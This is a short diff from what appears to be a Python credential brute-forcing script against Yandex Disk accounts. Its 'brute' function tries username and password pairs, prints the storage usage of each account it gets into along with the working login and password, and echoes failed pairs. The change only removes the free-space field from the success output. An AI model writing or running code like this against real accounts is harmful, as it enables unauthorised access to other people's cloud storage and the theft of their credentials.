@@ -89,7 +89,7 @@ def brute(username, password):
     try:
         disk = YaDisk(username, password)
         a = disk.df()
-        print('Used: '+size(int(a['used']))+' Free: '+size(int(a['available'])) + ' Summary size: '+ size(int(a['used'])+int(a['available'])) + " Login: " + username + " Password: " + password)
+        print('Used: '+size(int(a['used']))+' Summary size: '+ size(int(a['used'])+int(a['available'])) + " Login: " + username + " Password: " + password)
     except:
         #pass
         print ('Error : ' + username + ' ' + password, end="\r")
